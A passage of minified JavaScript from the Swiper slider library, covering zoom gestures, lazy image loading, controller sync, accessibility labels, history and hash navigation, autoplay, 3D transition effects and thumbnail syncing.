                        if (r.minX = Math.min(i.slideWidth / 2 - s / 2, 0), r.maxX = -r.minX, r.minY = Math.min(i.slideHeight / 2 - l / 2, 0), r.maxY = -r.minY, r.touchesCurrent.x = ("touchmove" === e.type ? e.targetTouches[0] : e).pageX, r.touchesCurrent.y = ("touchmove" === e.type ? e.targetTouches[0] : e).pageY, !r.isMoved && !n.isScaling) {
                            if (t.isHorizontal() && (Math.floor(r.minX) === Math.floor(r.startX) && r.touchesCurrent.x < r.touchesStart.x || Math.floor(r.maxX) === Math.floor(r.startX) && r.touchesCurrent.x > r.touchesStart.x)) return void (r.isTouched = !1);
                            if (!t.isHorizontal() && (Math.floor(r.minY) === Math.floor(r.startY) && r.touchesCurrent.y < r.touchesStart.y || Math.floor(r.maxY) === Math.floor(r.startY) && r.touchesCurrent.y > r.touchesStart.y)) return void (r.isTouched = !1)
                        }
                        e.preventDefault(), e.stopPropagation(), r.isMoved = !0, r.currentX = r.touchesCurrent.x - r.touchesStart.x + r.startX, r.currentY = r.touchesCurrent.y - r.touchesStart.y + r.startY, r.currentX < r.minX && (r.currentX = r.minX + 1 - Math.pow(r.minX - r.currentX + 1, .8)), r.currentX > r.maxX && (r.currentX = r.maxX - 1 + Math.pow(r.currentX - r.maxX + 1, .8)), r.currentY < r.minY && (r.currentY = r.minY + 1 - Math.pow(r.minY - r.currentY + 1, .8)), r.currentY > r.maxY && (r.currentY = r.maxY - 1 + Math.pow(r.currentY - r.maxY + 1, .8)), a.prevPositionX || (a.prevPositionX = r.touchesCurrent.x), a.prevPositionY || (a.prevPositionY = r.touchesCurrent.y), a.prevTime || (a.prevTime = Date.now()), a.x = (r.touchesCurrent.x - a.prevPositionX) / (Date.now() - a.prevTime) / 2, a.y = (r.touchesCurrent.y - a.prevPositionY) / (Date.now() - a.prevTime) / 2, Math.abs(r.touchesCurrent.x - a.prevPositionX) < 2 && (a.x = 0), Math.abs(r.touchesCurrent.y - a.prevPositionY) < 2 && (a.y = 0), a.prevPositionX = r.touchesCurrent.x, a.prevPositionY = r.touchesCurrent.y, a.prevTime = Date.now(), i.$imageWrapEl.transform("translate3d(" + r.currentX + "px, " + r.currentY + "px,0)")
                    }
                }
            }, onTouchEnd: function () {
                var e = this.zoom, t = e.gesture, n = e.image, i = e.velocity;
                if (t.$imageEl && 0 !== t.$imageEl.length) {
                    if (!n.isTouched || !n.isMoved) return n.isTouched = !1, void (n.isMoved = !1);
                    n.isTouched = !1, n.isMoved = !1;
                    var r = 300, a = 300, s = i.x * r, o = n.currentX + s;
                    s = i.y * a, s = n.currentY + s;
                    0 !== i.x && (r = Math.abs((o - n.currentX) / i.x)), 0 !== i.y && (a = Math.abs((s - n.currentY) / i.y)), a = Math.max(r, a), n.currentX = o, n.currentY = s, s = n.width * e.scale, e = n.height * e.scale, n.minX = Math.min(t.slideWidth / 2 - s / 2, 0), n.maxX = -n.minX, n.minY = Math.min(t.slideHeight / 2 - e / 2, 0), n.maxY = -n.minY, n.currentX = Math.max(Math.min(n.currentX, n.maxX), n.minX), n.currentY = Math.max(Math.min(n.currentY, n.maxY), n.minY), t.$imageWrapEl.transition(a).transform("translate3d(" + n.currentX + "px, " + n.currentY + "px,0)")
                }
            }, onTransitionEnd: function () {
                var e = this.zoom, t = e.gesture;
                t.$slideEl && this.previousIndex !== this.activeIndex && (t.$imageEl.transform("translate3d(0,0,0) scale(1)"), t.$imageWrapEl.transform("translate3d(0,0,0)"), e.scale = 1, e.currentScale = 1, t.$slideEl = void 0, t.$imageEl = void 0, t.$imageWrapEl = void 0)
            }, toggle: function (e) {
                var t = this.zoom;
                t.scale && 1 !== t.scale ? t.out() : t.in(e)
            }, in: function (e) {
                var t, n, r, a = this, s = a.zoom, o = a.params.zoom, l = s.gesture, c = s.image;
                l.$slideEl || (l.$slideEl = a.clickedSlide ? i(a.clickedSlide) : a.slides.eq(a.activeIndex), l.$imageEl = l.$slideEl.find("img, svg, canvas"), l.$imageWrapEl = l.$imageEl.parent("." + o.containerClass)), l.$imageEl && 0 !== l.$imageEl.length && (l.$slideEl.addClass("" + o.zoomedSlideClass), c = void 0 === c.touchesStart.x && e ? (r = ("touchend" === e.type ? e.changedTouches[0] : e).pageX, ("touchend" === e.type ? e.changedTouches[0] : e).pageY) : (r = c.touchesStart.x, c.touchesStart.y), s.scale = l.$imageWrapEl.attr("data-swiper-zoom") || o.maxRatio, s.currentScale = l.$imageWrapEl.attr("data-swiper-zoom") || o.maxRatio, e ? (o = l.$slideEl[0].offsetWidth, e = l.$slideEl[0].offsetHeight, t = l.$slideEl.offset().left + o / 2 - r, n = l.$slideEl.offset().top + e / 2 - c, r = l.$imageEl[0].offsetWidth, c = l.$imageEl[0].offsetHeight, r *= s.scale, c *= s.scale, r = -(o = Math.min(o / 2 - r / 2, 0)), c = -(e = Math.min(e / 2 - c / 2, 0)), r < (t = (t *= s.scale) < o ? o : t) && (t = r), c < (n = (n *= s.scale) < e ? e : n) && (n = c)) : n = t = 0, l.$imageWrapEl.transition(300).transform("translate3d(" + t + "px, " + n + "px,0)"), l.$imageEl.transition(300).transform("translate3d(0,0,0) scale(" + s.scale + ")"))
            }, out: function () {
                var e = this, t = e.zoom, n = e.params.zoom, r = t.gesture;
                r.$slideEl || (r.$slideEl = e.clickedSlide ? i(e.clickedSlide) : e.slides.eq(e.activeIndex), r.$imageEl = r.$slideEl.find("img, svg, canvas"), r.$imageWrapEl = r.$imageEl.parent("." + n.containerClass)), r.$imageEl && 0 !== r.$imageEl.length && (t.scale = 1, t.currentScale = 1, r.$imageWrapEl.transition(300).transform("translate3d(0,0,0)"), r.$imageEl.transition(300).transform("translate3d(0,0,0) scale(1)"), r.$slideEl.removeClass("" + n.zoomedSlideClass), r.$slideEl = void 0)
            }, enable: function () {
                var e, t = this, n = t.zoom;
                n.enabled || (n.enabled = !0, e = !("touchstart" !== t.touchEvents.start || !l.passiveListener || !t.params.passiveListeners) && {
                    passive: !0,
                    capture: !1
                }, l.gestures ? (t.$wrapperEl.on("gesturestart", ".swiper-slide", n.onGestureStart, e), t.$wrapperEl.on("gesturechange", ".swiper-slide", n.onGestureChange, e), t.$wrapperEl.on("gestureend", ".swiper-slide", n.onGestureEnd, e)) : "touchstart" === t.touchEvents.start && (t.$wrapperEl.on(t.touchEvents.start, ".swiper-slide", n.onGestureStart, e), t.$wrapperEl.on(t.touchEvents.move, ".swiper-slide", n.onGestureChange, e), t.$wrapperEl.on(t.touchEvents.end, ".swiper-slide", n.onGestureEnd, e)), t.$wrapperEl.on(t.touchEvents.move, "." + t.params.zoom.containerClass, n.onTouchMove))
            }, disable: function () {
                var e, t = this, n = t.zoom;
                n.enabled && (t.zoom.enabled = !1, e = !("touchstart" !== t.touchEvents.start || !l.passiveListener || !t.params.passiveListeners) && {
                    passive: !0,
                    capture: !1
                }, l.gestures ? (t.$wrapperEl.off("gesturestart", ".swiper-slide", n.onGestureStart, e), t.$wrapperEl.off("gesturechange", ".swiper-slide", n.onGestureChange, e), t.$wrapperEl.off("gestureend", ".swiper-slide", n.onGestureEnd, e)) : "touchstart" === t.touchEvents.start && (t.$wrapperEl.off(t.touchEvents.start, ".swiper-slide", n.onGestureStart, e), t.$wrapperEl.off(t.touchEvents.move, ".swiper-slide", n.onGestureChange, e), t.$wrapperEl.off(t.touchEvents.end, ".swiper-slide", n.onGestureEnd, e)), t.$wrapperEl.off(t.touchEvents.move, "." + t.params.zoom.containerClass, n.onTouchMove))
            }
        }, B = {
            loadInSlide: function (e, t) {
                void 0 === t && (t = !0);
                var n, r = this, a = r.params.lazy;
                void 0 !== e && 0 !== r.slides.length && (e = (n = r.virtual && r.params.virtual.enabled ? r.$wrapperEl.children("." + r.params.slideClass + '[data-swiper-slide-index="' + e + '"]') : r.slides.eq(e)).find("." + a.elementClass + ":not(." + a.loadedClass + "):not(." + a.loadingClass + ")"), 0 !== (e = !n.hasClass(a.elementClass) || n.hasClass(a.loadedClass) || n.hasClass(a.loadingClass) ? e : e.add(n[0])).length && e.each((function (e, s) {
                    var o = i(s);
                    o.addClass(a.loadingClass);
                    var l = o.attr("data-background"), c = o.attr("data-src"), u = o.attr("data-srcset"),
                        d = o.attr("data-sizes");
                    r.loadImage(o[0], c || l, u, d, !1, (function () {
                        var e, i;
                        null == r || !r || r && !r.params || r.destroyed || (l ? (o.css("background-image", 'url("' + l + '")'), o.removeAttr("data-background")) : (u && (o.attr("srcset", u), o.removeAttr("data-srcset")), d && (o.attr("sizes", d), o.removeAttr("data-sizes")), c && (o.attr("src", c), o.removeAttr("data-src"))), o.addClass(a.loadedClass).removeClass(a.loadingClass), n.find("." + a.preloaderClass).remove(), r.params.loop && t && (i = n.attr("data-swiper-slide-index"), n.hasClass(r.params.slideDuplicateClass) ? (e = r.$wrapperEl.children('[data-swiper-slide-index="' + i + '"]:not(.' + r.params.slideDuplicateClass + ")"), r.lazy.loadInSlide(e.index(), !1)) : (i = r.$wrapperEl.children("." + r.params.slideDuplicateClass + '[data-swiper-slide-index="' + i + '"]'), r.lazy.loadInSlide(i.index(), !1))), r.emit("lazyImageReady", n[0], o[0]))
                    })), r.emit("lazyImageLoad", n[0], o[0])
                })))
            }, load: function () {
                var e = this, t = e.$wrapperEl, n = e.params, r = e.slides, a = e.activeIndex,
                    s = e.virtual && n.virtual.enabled, o = n.lazy, l = n.slidesPerView;

                function c(e) {
                    if (s) {
                        if (t.children("." + n.slideClass + '[data-swiper-slide-index="' + e + '"]').length) return 1
                    } else if (r[e]) return 1
                }

                function u(e) {
                    return s ? i(e).attr("data-swiper-slide-index") : i(e).index()
                }

                if ("auto" === l && (l = 0), e.lazy.initialImageLoaded || (e.lazy.initialImageLoaded = !0), e.params.watchSlidesVisibility) t.children("." + n.slideVisibleClass).each((function (t, n) {
                    n = s ? i(n).attr("data-swiper-slide-index") : i(n).index(), e.lazy.loadInSlide(n)
                })); else if (1 < l) for (var d = a; d < a + l; d += 1) c(d) && e.lazy.loadInSlide(d); else e.lazy.loadInSlide(a);
                if (o.loadPrevNext) if (1 < l || o.loadPrevNextAmount && 1 < o.loadPrevNextAmount) {
                    for (var p = o.loadPrevNextAmount, h = (o = l, Math.min(a + o + Math.max(p, o), r.length)), f = (p = Math.max(a - Math.max(o, p), 0), a + l); f < h; f += 1) c(f) && e.lazy.loadInSlide(f);
                    for (var m = p; m < a; m += 1) c(m) && e.lazy.loadInSlide(m)
                } else 0 < (p = t.children("." + n.slideNextClass)).length && e.lazy.loadInSlide(u(p)), 0 < (p = t.children("." + n.slidePrevClass)).length && e.lazy.loadInSlide(u(p))
            }
        }, F = {
            LinearSpline: function (e, t) {
                var n, i, r, a, s;
                return this.x = e, this.y = t, this.lastIndex = e.length - 1, this.interpolate = function (e) {
                    return e ? (s = function (e, t) {
                        for (i = -1, n = e.length; 1 < n - i;) e[r = n + i >> 1] <= t ? i = r : n = r;
                        return n
                    }(this.x, e), a = s - 1, (e - this.x[a]) * (this.y[s] - this.y[a]) / (this.x[s] - this.x[a]) + this.y[a]) : 0
                }, this
            }, getInterpolateFunction: function (e) {
                var t = this;
                t.controller.spline || (t.controller.spline = t.params.loop ? new F.LinearSpline(t.slidesGrid, e.slidesGrid) : new F.LinearSpline(t.snapGrid, e.snapGrid))
            }, setTranslate: function (e, t) {
                var n, i, r = this, a = r.controller.control;

                function s(e) {
                    var t = r.rtlTranslate ? -r.translate : r.translate;
                    "slide" === r.params.controller.by && (r.controller.getInterpolateFunction(e), i = -r.controller.spline.interpolate(-t)), i && "container" !== r.params.controller.by || (n = (e.maxTranslate() - e.minTranslate()) / (r.maxTranslate() - r.minTranslate()), i = (t - r.minTranslate()) * n + e.minTranslate()), r.params.controller.inverse && (i = e.maxTranslate() - i), e.updateProgress(i), e.setTranslate(i, r), e.updateActiveIndex(), e.updateSlidesClasses()
                }

                if (Array.isArray(a)) for (var o = 0; o < a.length; o += 1) a[o] !== t && a[o] instanceof k && s(a[o]); else a instanceof k && t !== a && s(a)
            }, setTransition: function (e, t) {
                var n, i = this, r = i.controller.control;

                function a(t) {
                    t.setTransition(e, i), 0 !== e && (t.transitionStart(), t.params.autoHeight && o.nextTick((function () {
                        t.updateAutoHeight()
                    })), t.$wrapperEl.transitionEnd((function () {
                        r && (t.params.loop && "slide" === i.params.controller.by && t.loopFix(), t.transitionEnd())
                    })))
                }

                if (Array.isArray(r)) for (n = 0; n < r.length; n += 1) r[n] !== t && r[n] instanceof k && a(r[n]); else r instanceof k && t !== r && a(r)
            }
        }, R = {
            makeElFocusable: function (e) {
                return e.attr("tabIndex", "0"), e
            }, addElRole: function (e, t) {
                return e.attr("role", t), e
            }, addElLabel: function (e, t) {
                return e.attr("aria-label", t), e
            }, disableEl: function (e) {
                return e.attr("aria-disabled", !0), e
            }, enableEl: function (e) {
                return e.attr("aria-disabled", !1), e
            }, onEnterKey: function (e) {
                var t = this, n = t.params.a11y;
                13 === e.keyCode && (e = i(e.target), t.navigation && t.navigation.$nextEl && e.is(t.navigation.$nextEl) && (t.isEnd && !t.params.loop || t.slideNext(), t.isEnd ? t.a11y.notify(n.lastSlideMessage) : t.a11y.notify(n.nextSlideMessage)), t.navigation && t.navigation.$prevEl && e.is(t.navigation.$prevEl) && (t.isBeginning && !t.params.loop || t.slidePrev(), t.isBeginning ? t.a11y.notify(n.firstSlideMessage) : t.a11y.notify(n.prevSlideMessage)), t.pagination && e.is("." + t.params.pagination.bulletClass) && e[0].click())
            }, notify: function (e) {
                var t = this.a11y.liveRegion;
                0 !== t.length && (t.html(""), t.html(e))
            }, updateNavigation: function () {
                var e, t, n = this;
                n.params.loop || (e = (t = n.navigation).$nextEl, (t = t.$prevEl) && 0 < t.length && (n.isBeginning ? n.a11y.disableEl(t) : n.a11y.enableEl(t)), e && 0 < e.length && (n.isEnd ? n.a11y.disableEl(e) : n.a11y.enableEl(e)))
            }, updatePagination: function () {
                var e = this, t = e.params.a11y;
                e.pagination && e.params.pagination.clickable && e.pagination.bullets && e.pagination.bullets.length && e.pagination.bullets.each((function (n, r) {
                    r = i(r), e.a11y.makeElFocusable(r), e.a11y.addElRole(r, "button"), e.a11y.addElLabel(r, t.paginationBulletMessage.replace(/{{index}}/, r.index() + 1))
                }))
            }, init: function () {
                var e = this;
                e.$el.append(e.a11y.liveRegion);
                var t, n, i = e.params.a11y;
                e.navigation && e.navigation.$nextEl && (t = e.navigation.$nextEl), e.navigation && e.navigation.$prevEl && (n = e.navigation.$prevEl), t && (e.a11y.makeElFocusable(t), e.a11y.addElRole(t, "button"), e.a11y.addElLabel(t, i.nextSlideMessage), t.on("keydown", e.a11y.onEnterKey)), n && (e.a11y.makeElFocusable(n), e.a11y.addElRole(n, "button"), e.a11y.addElLabel(n, i.prevSlideMessage), n.on("keydown", e.a11y.onEnterKey)), e.pagination && e.params.pagination.clickable && e.pagination.bullets && e.pagination.bullets.length && e.pagination.$el.on("keydown", "." + e.params.pagination.bulletClass, e.a11y.onEnterKey)
            }, destroy: function () {
                var e, t, n = this;
                n.a11y.liveRegion && 0 < n.a11y.liveRegion.length && n.a11y.liveRegion.remove(), n.navigation && n.navigation.$nextEl && (e = n.navigation.$nextEl), n.navigation && n.navigation.$prevEl && (t = n.navigation.$prevEl), e && e.off("keydown", n.a11y.onEnterKey), t && t.off("keydown", n.a11y.onEnterKey), n.pagination && n.params.pagination.clickable && n.pagination.bullets && n.pagination.bullets.length && n.pagination.$el.off("keydown", "." + n.params.pagination.bulletClass, n.a11y.onEnterKey)
            }
        }, j = {
            init: function () {
                var e = this;
                if (e.params.history) {
                    if (!n.history || !n.history.pushState) return e.params.history.enabled = !1, void (e.params.hashNavigation.enabled = !0);
                    var t = e.history;
                    t.initialized = !0, t.paths = j.getPathValues(), (t.paths.key || t.paths.value) && (t.scrollToSlide(0, t.paths.value, e.params.runCallbacksOnInit), e.params.history.replaceState || n.addEventListener("popstate", e.history.setHistoryPopState))
                }
            }, destroy: function () {
                this.params.history.replaceState || n.removeEventListener("popstate", this.history.setHistoryPopState)
            }, setHistoryPopState: function () {
                this.history.paths = j.getPathValues(), this.history.scrollToSlide(this.params.speed, this.history.paths.value, !1)
            }, getPathValues: function () {
                var e = n.location.pathname.slice(1).split("/").filter((function (e) {
                    return "" !== e
                })), t = e.length;
                return {key: e[t - 2], value: e[t - 1]}
            }, setHistory: function (e, t) {
                this.history.initialized && this.params.history.enabled && (t = this.slides.eq(t), t = j.slugify(t.attr("data-history")), n.location.pathname.includes(e) || (t = e + "/" + t), (e = n.history.state) && e.value === t || (this.params.history.replaceState ? n.history.replaceState({value: t}, null, t) : n.history.pushState({value: t}, null, t)))
            }, slugify: function (e) {
                return e.toString().replace(/\s+/g, "-").replace(/[^\w-]+/g, "").replace(/--+/g, "-").replace(/^-+/, "").replace(/-+$/, "")
            }, scrollToSlide: function (e, t, n) {
                var i = this;
                if (t) for (var r = 0, a = i.slides.length; r < a; r += 1) {
                    var s = i.slides.eq(r);
                    j.slugify(s.attr("data-history")) !== t || s.hasClass(i.params.slideDuplicateClass) || (s = s.index(), i.slideTo(s, e, n))
                } else i.slideTo(0, e, n)
            }
        }, q = {
            onHashCange: function () {
                var e = this, n = t.location.hash.replace("#", "");
                n === e.slides.eq(e.activeIndex).attr("data-hash") || void 0 !== (n = e.$wrapperEl.children("." + e.params.slideClass + '[data-hash="' + n + '"]').index()) && e.slideTo(n)
            }, setHash: function () {
                var e = this;
                e.hashNavigation.initialized && e.params.hashNavigation.enabled && (e.params.hashNavigation.replaceState && n.history && n.history.replaceState ? n.history.replaceState(null, null, "#" + e.slides.eq(e.activeIndex).attr("data-hash") || "") : (e = (e = e.slides.eq(e.activeIndex)).attr("data-hash") || e.attr("data-history"), t.location.hash = e || ""))
            }, init: function () {
                var e = this;
                if (!(!e.params.hashNavigation.enabled || e.params.history && e.params.history.enabled)) {
                    e.hashNavigation.initialized = !0;
                    var r = t.location.hash.replace("#", "");
                    if (r) for (var a = 0, s = e.slides.length; a < s; a += 1) {
                        var o = e.slides.eq(a);
                        (o.attr("data-hash") || o.attr("data-history")) !== r || o.hasClass(e.params.slideDuplicateClass) || (o = o.index(), e.slideTo(o, 0, e.params.runCallbacksOnInit, !0))
                    }
                    e.params.hashNavigation.watchState && i(n).on("hashchange", e.hashNavigation.onHashCange)
                }
            }, destroy: function () {
                this.params.hashNavigation.watchState && i(n).off("hashchange", this.hashNavigation.onHashCange)
            }
        }, V = {
            run: function () {
                var e = this, t = e.slides.eq(e.activeIndex), n = e.params.autoplay.delay;
                t.attr("data-swiper-autoplay") && (n = t.attr("data-swiper-autoplay") || e.params.autoplay.delay), e.autoplay.timeout = o.nextTick((function () {
                    e.params.autoplay.reverseDirection ? e.params.loop ? (e.loopFix(), e.slidePrev(e.params.speed, !0, !0), e.emit("autoplay")) : e.isBeginning ? e.params.autoplay.stopOnLastSlide ? e.autoplay.stop() : (e.slideTo(e.slides.length - 1, e.params.speed, !0, !0), e.emit("autoplay")) : (e.slidePrev(e.params.speed, !0, !0), e.emit("autoplay")) : e.params.loop ? (e.loopFix(), e.slideNext(e.params.speed, !0, !0), e.emit("autoplay")) : e.isEnd ? e.params.autoplay.stopOnLastSlide ? e.autoplay.stop() : (e.slideTo(0, e.params.speed, !0, !0), e.emit("autoplay")) : (e.slideNext(e.params.speed, !0, !0), e.emit("autoplay"))
                }), n)
            }, start: function () {
                var e = this;
                return void 0 === e.autoplay.timeout && !e.autoplay.running && (e.autoplay.running = !0, e.emit("autoplayStart"), e.autoplay.run(), !0)
            }, stop: function () {
                var e = this;
                return !!e.autoplay.running && void 0 !== e.autoplay.timeout && (e.autoplay.timeout && (clearTimeout(e.autoplay.timeout), e.autoplay.timeout = void 0), e.autoplay.running = !1, e.emit("autoplayStop"), !0)
            }, pause: function (e) {
                var t = this;
                t.autoplay.running && (t.autoplay.paused || (t.autoplay.timeout && clearTimeout(t.autoplay.timeout), t.autoplay.paused = !0, 0 !== e && t.params.autoplay.waitForTransition ? (t.$wrapperEl[0].addEventListener("transitionend", t.autoplay.onTransitionEnd), t.$wrapperEl[0].addEventListener("webkitTransitionEnd", t.autoplay.onTransitionEnd)) : (t.autoplay.paused = !1, t.autoplay.run())))
            }
        }, G = {
            setTranslate: function () {
                for (var e = this, t = e.slides, n = 0; n < t.length; n += 1) {
                    var i = e.slides.eq(n), r = -i[0].swiperSlideOffset;
                    e.params.virtualTranslate || (r -= e.translate);
                    var a = 0;
                    e.isHorizontal() || (a = r, r = 0);
                    var s = e.params.fadeEffect.crossFade ? Math.max(1 - Math.abs(i[0].progress), 0) : 1 + Math.min(Math.max(i[0].progress, -1), 0);
                    i.css({opacity: s}).transform("translate3d(" + r + "px, " + a + "px, 0px)")
                }
            }, setTransition: function (e) {
                var t, n = this, i = n.slides, r = n.$wrapperEl;
                i.transition(e), n.params.virtualTranslate && 0 !== e && (t = !1, i.transitionEnd((function () {
                    if (!t && n && !n.destroyed) {
                        t = !0, n.animating = !1;
                        for (var e = ["webkitTransitionEnd", "transitionend"], i = 0; i < e.length; i += 1) r.trigger(e[i])
                    }
                })))
            }
        }, X = {
            setTranslate: function () {
                var e, t = this, n = t.$el, r = t.$wrapperEl, a = t.slides, s = t.width, o = t.height, l = t.rtlTranslate,
                    u = t.size, d = t.params.cubeEffect, p = t.isHorizontal(), h = t.virtual && t.params.virtual.enabled,
                    f = 0;
                d.shadow && (p ? (0 === (e = r.find(".swiper-cube-shadow")).length && (e = i('<div class="swiper-cube-shadow"></div>'), r.append(e)), e.css({height: s + "px"})) : 0 === (e = n.find(".swiper-cube-shadow")).length && (e = i('<div class="swiper-cube-shadow"></div>'), n.append(e)));
                for (var m, v = 0; v < a.length; v += 1) {
                    var g = a.eq(v), y = v, b = 90 * (y = h ? parseInt(g.attr("data-swiper-slide-index"), 10) : y),
                        x = Math.floor(b / 360);
                    l && (b = -b, x = Math.floor(-b / 360));
                    var w = Math.max(Math.min(g[0].progress, 1), -1), S = 0, E = 0, C = 0;
                    y % 4 == 0 ? (S = 4 * -x * u, C = 0) : (y - 1) % 4 == 0 ? (S = 0, C = 4 * -x * u) : (y - 2) % 4 == 0 ? (S = u + 4 * x * u, C = u) : (y - 3) % 4 == 0 && (S = -u, C = 3 * u + 4 * u * x), l && (S = -S), p || (E = S, S = 0), w <= 1 && -1 < w && (f = l ? 90 * -y - 90 * w : 90 * y + 90 * w), g.transform("rotateX(" + (p ? 0 : -b) + "deg) rotateY(" + (p ? b : 0) + "deg) translate3d(" + S + "px, " + E + "px, " + C + "px)"), d.slideShadows && (E = p ? g.find(".swiper-slide-shadow-left") : g.find(".swiper-slide-shadow-top"), C = p ? g.find(".swiper-slide-shadow-right") : g.find(".swiper-slide-shadow-bottom"), 0 === E.length && (E = i('<div class="swiper-slide-shadow-' + (p ? "left" : "top") + '"></div>'), g.append(E)), 0 === C.length && (C = i('<div class="swiper-slide-shadow-' + (p ? "right" : "bottom") + '"></div>'), g.append(C)), E.length && (E[0].style.opacity = Math.max(-w, 0)), C.length && (C[0].style.opacity = Math.max(w, 0)))
                }
                r.css({
                    "-webkit-transform-origin": "50% 50% -" + u / 2 + "px",
                    "-moz-transform-origin": "50% 50% -" + u / 2 + "px",
                    "-ms-transform-origin": "50% 50% -" + u / 2 + "px",
                    "transform-origin": "50% 50% -" + u / 2 + "px"
                }), d.shadow && (p ? e.transform("translate3d(0px, " + (s / 2 + d.shadowOffset) + "px, " + -s / 2 + "px) rotateX(90deg) rotateZ(0deg) scale(" + d.shadowScale + ")") : (m = Math.abs(f) - 90 * Math.floor(Math.abs(f) / 90), n = 1.5 - (Math.sin(2 * m * Math.PI / 360) / 2 + Math.cos(2 * m * Math.PI / 360) / 2), s = d.shadowScale, m = d.shadowScale / n, n = d.shadowOffset, e.transform("scale3d(" + s + ", 1, " + m + ") translate3d(0px, " + (o / 2 + n) + "px, " + -o / 2 / m + "px) rotateX(-90deg)"))), r.transform("translate3d(0px,0," + (c.isSafari || c.isUiWebView ? -u / 2 : 0) + "px) rotateX(" + (t.isHorizontal() ? 0 : f) + "deg) rotateY(" + (t.isHorizontal() ? -f : 0) + "deg)")
            }, setTransition: function (e) {
                var t = this.$el;
                this.slides.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e), this.params.cubeEffect.shadow && !this.isHorizontal() && t.find(".swiper-cube-shadow").transition(e)
            }
        }, W = {
            setTranslate: function () {
                for (var e = this, t = e.slides, n = e.rtlTranslate, r = 0; r < t.length; r += 1) {
                    var a, s, o = t.eq(r), l = o[0].progress,
                        c = -180 * (l = e.params.flipEffect.limitRotation ? Math.max(Math.min(o[0].progress, 1), -1) : l),
                        u = 0, d = -o[0].swiperSlideOffset, p = 0;
                    e.isHorizontal() ? n && (c = -c) : (p = d, u = -c, c = d = 0), o[0].style.zIndex = -Math.abs(Math.round(l)) + t.length, e.params.flipEffect.slideShadows && (a = e.isHorizontal() ? o.find(".swiper-slide-shadow-left") : o.find(".swiper-slide-shadow-top"), s = e.isHorizontal() ? o.find(".swiper-slide-shadow-right") : o.find(".swiper-slide-shadow-bottom"), 0 === a.length && (a = i('<div class="swiper-slide-shadow-' + (e.isHorizontal() ? "left" : "top") + '"></div>'), o.append(a)), 0 === s.length && (s = i('<div class="swiper-slide-shadow-' + (e.isHorizontal() ? "right" : "bottom") + '"></div>'), o.append(s)), a.length && (a[0].style.opacity = Math.max(-l, 0)), s.length && (s[0].style.opacity = Math.max(l, 0))), o.transform("translate3d(" + d + "px, " + p + "px, 0px) rotateX(" + u + "deg) rotateY(" + c + "deg)")
                }
            }, setTransition: function (e) {
                var t, n = this, i = n.slides, r = n.activeIndex, a = n.$wrapperEl;
                i.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e), n.params.virtualTranslate && 0 !== e && (t = !1, i.eq(r).transitionEnd((function () {
                    if (!t && n && !n.destroyed) {
                        t = !0, n.animating = !1;
                        for (var e = ["webkitTransitionEnd", "transitionend"], i = 0; i < e.length; i += 1) a.trigger(e[i])
                    }
                })))
            }
        }, Y = {
            setTranslate: function () {
                for (var e = (c = this).width, t = c.height, n = c.slides, r = c.$wrapperEl, a = c.slidesSizesGrid, s = c.params.coverflowEffect, o = c.isHorizontal(), c = c.translate, u = o ? e / 2 - c : t / 2 - c, d = o ? s.rotate : -s.rotate, p = s.depth, h = 0, f = n.length; h < f; h += 1) {
                    var m = n.eq(h), v = a[h], g = (u - m[0].swiperSlideOffset - v / 2) / v * s.modifier, y = o ? d * g : 0,
                        b = o ? 0 : d * g, x = -p * Math.abs(g), w = o ? 0 : s.stretch * g;
                    v = o ? s.stretch * g : 0;
                    Math.abs(v) < .001 && (v = 0), Math.abs(w) < .001 && (w = 0), Math.abs(x) < .001 && (x = 0), Math.abs(y) < .001 && (y = 0), Math.abs(b) < .001 && (b = 0), m.transform("translate3d(" + v + "px," + w + "px," + x + "px)  rotateX(" + b + "deg) rotateY(" + y + "deg)"), m[0].style.zIndex = 1 - Math.abs(Math.round(g)), s.slideShadows && (b = o ? m.find(".swiper-slide-shadow-left") : m.find(".swiper-slide-shadow-top"), y = o ? m.find(".swiper-slide-shadow-right") : m.find(".swiper-slide-shadow-bottom"), 0 === b.length && (b = i('<div class="swiper-slide-shadow-' + (o ? "left" : "top") + '"></div>'), m.append(b)), 0 === y.length && (y = i('<div class="swiper-slide-shadow-' + (o ? "right" : "bottom") + '"></div>'), m.append(y)), b.length && (b[0].style.opacity = 0 < g ? g : 0), y.length && (y[0].style.opacity = 0 < -g ? -g : 0))
                }
                (l.pointerEvents || l.prefixedPointerEvents) && (r[0].style.perspectiveOrigin = u + "px 50%")
            }, setTransition: function (e) {
                this.slides.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e)
            }
        }, U = {
            init: function () {
                var e = this, t = e.params.thumbs, n = e.constructor;
                t.swiper instanceof n ? (e.thumbs.swiper = t.swiper, o.extend(e.thumbs.swiper.originalParams, {
                    watchSlidesProgress: !0,
                    slideToClickedSlide: !1
                }), o.extend(e.thumbs.swiper.params, {
                    watchSlidesProgress: !0,
                    slideToClickedSlide: !1
                })) : o.isObject(t.swiper) && (e.thumbs.swiper = new n(o.extend({}, t.swiper, {
                    watchSlidesVisibility: !0,
                    watchSlidesProgress: !0,
                    slideToClickedSlide: !1
                })), e.thumbs.swiperCreated = !0), e.thumbs.swiper.$el.addClass(e.params.thumbs.thumbsContainerClass), e.thumbs.swiper.on("tap", e.thumbs.onThumbClick)
            }, onThumbClick: function () {
                var e, t, n, r = this, a = r.thumbs.swiper;
                a && (t = a.clickedIndex, (e = a.clickedSlide) && i(e).hasClass(r.params.thumbs.slideThumbActiveClass) || null == t || (n = a.params.loop ? parseInt(i(a.clickedSlide).attr("data-swiper-slide-index"), 10) : t, r.params.loop && (e = r.activeIndex, r.slides.eq(e).hasClass(r.params.slideDuplicateClass) && (r.loopFix(), r._clientLeft = r.$wrapperEl[0].clientLeft, e = r.activeIndex), a = r.slides.eq(e).prevAll('[data-swiper-slide-index="' + n + '"]').eq(0).index(), t = r.slides.eq(e).nextAll('[data-swiper-slide-index="' + n + '"]').eq(0).index(), n = void 0 === a || void 0 !== t && t - e < e - a ? t : a), r.slideTo(n)))
            }, update: function (e) {
                var t = this, n = t.thumbs.swiper;
                if (n) {
                    var i, r, a, s = "auto" === n.params.slidesPerView ? n.slidesPerViewDynamic() : n.params.slidesPerView;
